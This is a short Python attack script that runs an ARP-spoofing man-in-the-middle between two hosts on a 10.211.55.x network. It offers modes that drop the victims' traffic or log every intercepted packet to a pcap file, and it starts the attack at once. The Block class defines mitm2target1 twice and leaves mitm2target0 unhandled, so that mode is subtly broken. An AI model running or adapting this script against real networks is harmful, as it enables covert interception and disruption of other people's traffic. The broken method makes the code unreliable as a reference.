from ARP_Spoofing import *


class ARP_Spoofing_Block(ARP_Spoofing_MITM):
    def __init__(self, target0_ip: str, target1_ip: str):
        super().__init__(target0_ip, target1_ip)

    def mitm2target1(self, pkg):
        return []

    def mitm2target1(self, pkg):
        return []


class ARP_Spoofing_Intercept(ARP_Spoofing_MITM):
    def __init__(self, target0_ip: str, target1_ip: str, pcap_filename: str):
        super().__init__(target0_ip, target1_ip)
        self.pcap_filename = pcap_filename

    def mitm2target1(self, pkg):
        print('target0 -> target1', pkg)
        wrpcap(self.pcap_filename, pkg, append=True)
        return [pkg]

    def mitm2target0(self, pkg):
        print('target1 -> target0', pkg)
        wrpcap(self.pcap_filename, pkg, append=True)
        return [pkg]

mitm = ARP_Spoofing_MITM('10.211.55.5', '10.211.55.1')
# mitm = ARP_Spoofing_Block('10.211.55.5', '10.211.55.1')
# mitm = ARP_Spoofing_Intercept('10.211.55.5', '10.211.55.1', 'intercept.pcap')

mitm.start()

input()
